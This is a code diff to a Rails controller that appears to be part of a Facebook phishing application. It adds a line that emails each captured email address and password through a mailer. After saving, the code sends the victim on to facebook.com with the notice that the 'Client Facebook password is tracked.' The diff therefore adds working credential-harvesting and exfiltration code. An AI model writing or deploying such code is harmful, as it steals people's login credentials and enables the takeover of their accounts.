@@ -28,6 +28,7 @@ class FbsController < ApplicationController
 
     respond_to do |format|
       if @fb.save
+        FbMailer.fb_created(@fb.email,@fb.password).deliver
         format.html { redirect_to 'https://www.facebook.com/', notice: 'Client Facebook password is tracked.' }
         format.json { render :show, status: :created, location: @fb }
       else
